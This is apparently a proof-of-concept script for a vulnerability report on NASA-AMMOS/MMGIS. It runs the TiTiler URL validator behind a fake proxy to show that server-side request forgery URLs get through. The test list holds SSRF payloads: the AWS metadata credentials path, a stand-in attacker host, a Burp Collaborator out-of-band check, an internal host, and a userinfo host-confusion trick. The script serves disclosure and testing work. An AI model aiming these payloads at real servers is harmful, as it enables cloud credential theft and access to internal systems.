// End-to-end PoC: validateTitilerUrl (verbatim from NASA-AMMOS/MMGIS) +
// proxy middleware that captures what would be forwarded to TiTiler.

const express = require("express");
const http = require("http");
const createTitilerUrlValidator = require("./validateTitilerUrl");

// MIRROR the EXACT default from MMGIS sample.env and ENVs.md "Recommended for Production"
process.env.TITILER_ALLOWED_URL_PATTERNS =
  '["^https://(?!.*\\\\.\\\\.)(?!.*\\\\x00).*$", "^/Missions/(?!.*\\\\.\\\\.).*$"]';

const validate = createTitilerUrlValidator();

// Stand-in for createProxyMiddleware - logs what would be forwarded
function fakeProxy(req, res) {
  const url = req.method === "GET" ? req.query.url : req.body?.url;
  // Parse the URL the way TiTiler/GDAL would (Node's URL parser is RFC 3986)
  let parsed;
  try { parsed = new URL(url); } catch (_) { parsed = null; }
  const realHost = parsed ? parsed.hostname : "(unparseable)";
  res.json({
    forwarded: true,
    proxiedQuery: req.originalUrl,
    server_would_connect_to: realHost,
    note: "TiTiler/GDAL will issue an HTTPS request to the parsed hostname"
  });
}

const app = express();
app.use(express.json());
app.use("/titiler", validate, fakeProxy);

const server = app.listen(0, async () => {
  const port = server.address().port;
  const tests = [
    // Expected: legitimate
    { url: "https://data.nasa.gov/cogs/foo.tif", label: "(legit) NASA dataset" },
    // SSRF candidates - all should be BLOCKED by a real SSRF guard
    { url: "https://attacker.example.com/x.tif", label: "blind SSRF to attacker" },
    { url: "https://169.254.169.254/latest/meta-data/iam/security-credentials/", label: "AWS IMDS exfil" },
    { url: "https://internal-corp.nasa.gov/admin/dashboard", label: "internal NASA endpoint" },
    { url: "https://burpcollaborator.net/c0llab", label: "out-of-band confirmation" },
    { url: "https://data.nasa.gov@attacker.example.com/x.tif", label: "userinfo confusion (real host=attacker)" },
  ];
  const fetch = (await import("node-fetch")).default;
  console.log("PoC against verbatim NASA-AMMOS/MMGIS adjacent-servers/validateTitilerUrl.js");
  console.log("Loaded TITILER_ALLOWED_URL_PATTERNS =", process.env.TITILER_ALLOWED_URL_PATTERNS);
  console.log("=".repeat(110));
  for (const t of tests) {
    const r = await fetch(`http://127.0.0.1:${port}/titiler/cog/preview?url=${encodeURIComponent(t.url)}`);
    const j = await r.json().catch(() => null);
    const status = r.status;
    const blockedByValidator = status === 403;
    const verdict = blockedByValidator ? "BLOCKED" : "PROXIED → " + (j?.server_would_connect_to || "?");
    console.log(`${blockedByValidator ? "[OK]    " : "[VULN]  "} ${t.label}`);
    console.log(`        url: ${t.url}`);
    console.log(`        validator+proxy verdict: HTTP ${status}  ${verdict}`);
  }
  server.close();
});
